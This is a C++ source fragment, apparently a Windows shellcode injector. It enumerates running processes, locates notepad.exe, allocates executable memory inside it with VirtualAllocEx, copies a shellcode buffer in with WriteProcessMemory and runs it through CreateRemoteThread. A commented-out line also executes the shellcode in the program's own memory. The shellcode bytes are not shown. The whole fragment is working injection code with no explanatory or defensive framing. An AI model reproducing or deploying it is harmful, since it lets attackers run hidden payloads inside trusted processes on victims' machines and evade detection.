int main()
{
    std::cout << "Start\n"; 
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	QWORD virtuAllocAddr;
	TCHAR szProcessNameToFind[MAX_PATH] = TEXT("notepad.exe");
	unsigned int i;
	unsigned int processID;

	printf("strlen(shellcode)=%d\n", strlen(shellcode));

//void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(exec, shellcode, sizeof shellcode);
//((void(*)())exec)();
	
	

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return 1;
	}


	// Calculate how many process identifiers were returned.

	cProcesses = cbNeeded / sizeof(DWORD);

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			PrintProcessNameAndID(aProcesses[i]);
			processID = findProcessID(aProcesses[i], szProcessNameToFind);
			if (processID != 0) {
				_tprintf(TEXT("Cool!!! (PID: %u)\n"), processID);
				HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
					PROCESS_VM_READ |
					PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
					FALSE, processID);
				virtuAllocAddr = (QWORD)VirtualAllocEx(hProcess,NULL, sizeof shellcode,MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				WriteProcessMemory(hProcess, (LPVOID)virtuAllocAddr, shellcode,sizeof shellcode,NULL);
				CreateRemoteThread(hProcess,NULL,0x0, (LPTHREAD_START_ROUTINE)virtuAllocAddr,NULL,0x0,NULL);
				_tprintf(TEXT("Cool!!! (PID: %u)\n"), processID);
			}
		}
	}
	std::cout << "End\n";
	std::cin >> i;
}

